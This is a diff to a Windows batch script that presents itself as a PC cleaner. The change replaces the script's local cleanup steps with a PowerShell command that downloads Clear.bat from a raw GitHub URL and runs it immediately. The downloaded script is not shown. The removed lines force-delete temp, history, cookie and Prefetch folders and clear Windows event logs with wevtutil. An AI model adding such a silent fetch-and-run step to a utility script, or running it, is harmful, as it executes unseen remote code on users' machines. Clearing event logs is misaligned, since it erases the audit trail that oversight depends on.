@@ -554,32 +554,9 @@ goto nettot
 cls
 @echo off
 echo Cleaning PC...
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Clear.bat" -OutFile "Clear.bat"
+start /wait Clear.bat
 ping -n 4.5 127.0.0.1>nul
-:G2 
-
-color c
-/s /f /q c:\windows\temp\*.*
-rd /s /q c:\windows\temp
-md c:\windows\temp
-del /s /f /q C:\WINDOWS\Prefetch
-del /s /f /q %temp%\*.*
-rd /s /q %temp%
-md %temp%
-deltree /y c:\windows\tempor~1
-deltree /y c:\windows\temp
-deltree /y c:\windows\tmp
-deltree /y c:\windows\ff*.tmp
-deltree /y c:\windows\history
-deltree /y c:\windows\cookies
-deltree /y c:\windows\recent
-deltree /y c:\windows\spool\printers
-
-cls 
-:do_clear
-echo clearing %1
-wevtutil.exe cl %1
-cls
-echo Successful
 @echo off
 cls
 TIMEOUT 3 /nobreak > nul
